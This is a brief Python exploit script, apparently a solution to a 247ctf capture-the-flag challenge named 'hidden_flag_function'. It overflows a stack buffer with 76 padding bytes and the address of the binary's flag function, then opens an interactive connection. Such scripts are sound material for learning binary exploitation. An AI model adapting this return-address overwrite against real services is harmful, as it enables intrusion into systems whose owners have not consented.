#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./hidden_flag_function')
host = args.HOST or 'd7e65441cdbee03f.247ctf.com'
port = int(args.PORT or 50291)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()
sl(b"A"*76 + p(exe.sym.flag))
io.interactive()
